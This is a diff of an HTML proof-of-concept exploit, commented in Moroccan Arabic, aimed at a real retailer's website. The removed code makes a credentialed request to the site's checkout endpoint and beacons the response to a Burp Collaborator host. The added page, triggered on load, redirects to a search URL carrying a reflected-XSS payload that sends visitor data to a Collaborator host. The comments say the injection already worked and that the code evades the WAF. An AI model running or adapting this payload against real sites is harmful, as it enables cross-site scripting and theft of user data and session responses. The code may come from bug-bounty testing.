@@ -1,12 +1,22 @@
-<script>
-    var xhr = new XMLHttpRequest();
-    xhr.open("POST", "https://www.decathlon.com/shopify_pay/accelerated_checkout", true);
-    xhr.withCredentials = true; // هادي هي اللي كتجر الكوكيز
-    xhr.onreadystatechange = function() {
-        if (xhr.readyState == 4) {
-            // صيفط الداتا نيشان لـ Collaborator بلا تشفير (باش مايعيقش الـ WAF)
-            navigator.sendBeacon("https://gn7qbnn0jgv8qpu5xza8r0zrzi59t3hs.oastify.com/?data=" + xhr.responseText.substring(0,100));
+<!DOCTYPE html>
+<html>
+<body onload="launchPoC()">
+    <script>
+        function launchPoC() {
+            // الرابط ديالك فـ Burp Collaborator
+            var collab = "ji5t6qi3ejqblsp8s25bm3uuul0co7cw.oastify.com";
+
+            // هادا هو الكود اللي بغيتي ينفذ الـ IP Audit
+            // استعملنا navigator.userAgent حيت هو اللي كيبين الـ IP فـ السيرفر ديال Burp
+            var myScript = "fetch('https://" + collab + "/?audit_ip='.concat(btoa(navigator.userAgent)))";
+
+            // الرابط اللي ديجا جربناه وخدم (Reflected XSS)
+            // استعملنا </h1 ><script > باش نحقنو الكود مباشرة فـ الصفحة
+            var targetUrl = "https://www.decathlon.com/search?q=%3C/h1%3E%3Cscript%3E" + myScript + "%3C/script%3E";
+
+            // التوجيه التلقائي
+            window.location.href = targetUrl;
         }
-    };
-    xhr.send();
-</script>
+    </script>
+</body>
+</html>
